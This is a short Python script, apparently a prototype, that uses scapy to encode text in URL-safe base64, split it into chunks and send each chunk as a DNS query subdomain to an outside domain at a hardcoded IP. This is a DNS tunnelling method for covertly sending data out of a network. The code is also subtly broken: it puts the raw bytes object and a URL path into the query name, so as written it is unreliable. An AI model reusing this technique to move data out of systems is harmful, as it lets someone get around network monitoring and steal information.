from scapy.all import DNS, DNSQR, IP, sr1, UDP
import base64
import codecs

def dns_request(sub_domain):
    qname = f"{sub_domain}.dns.bitlus.online/api/dnstunneling"
    dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
    answer = sr1(dns_req, verbose=1, timeout=5)
    if answer:
        #print(codecs.decode(answer, 'utf-8'))
        print(answer.summary())
    else:
        print("No response received.")

text = "test"
# urlsafe_b64encode for DNS-friendly encoding
text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))

chunk_size = 6
chunks = [text_bytes[i:i+chunk_size] for i in range(0, len(text_bytes), chunk_size)]

for chunk in chunks:
    # Can give errors with =
    decoded_chunk = chunk.decode('utf-8').rstrip('=')
    # Send the request
    dns_request(chunk)
